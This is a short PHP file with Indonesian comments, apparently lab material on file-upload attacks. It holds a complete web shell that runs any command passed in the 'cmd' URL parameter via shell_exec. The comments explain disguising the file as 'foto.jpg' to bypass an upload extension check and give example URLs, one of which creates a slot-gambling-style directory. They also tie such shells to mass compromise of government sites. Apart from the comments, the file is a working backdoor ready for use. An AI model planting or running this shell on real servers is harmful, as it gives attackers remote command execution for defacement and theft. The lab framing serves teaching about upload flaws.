<?php
// ============================================================
// shell.php — WEB SHELL SEDERHANA (pintu belakang)
// ============================================================
// PENJELASAN: File ini disamarkan penyerang sebagai "foto.jpg"
// agar lolos cek ekstensi di upload.php. Begitu tersimpan dan
// dibuka di browser, server MENGEKSEKUSI kode PHP di dalamnya.
// ============================================================
// Cara pakai di lab:
//   http://localhost:8080/uploads/foto.jpg?cmd=ls
//   http://localhost:8080/uploads/foto.jpg?cmd=pwd
//   http://localhost:8080/uploads/foto.jpg?cmd=mkdir+slot-gacor-terbaru
// Server menjalankan perintah dan menampilkan hasilnya.
// ============================================================
if (isset($_GET['cmd'])) {
    echo "<pre>hasil perintah: " . htmlspecialchars($_GET['cmd']) . "\n\n";
    echo shell_exec($_GET['cmd']);
    echo "</pre>";
} else {
    echo "Kosong. Kirim parameter ?cmd=... — contoh: shell.php?cmd=ls";
}
// INGAT: file seperti ini yang membuat 3.908 laman .go.id disusupi.
// Nama file bisa .jpg, .png, .txt, dsb — yang penting server
// mengeksekusi isinya sebagai PHP.
?>
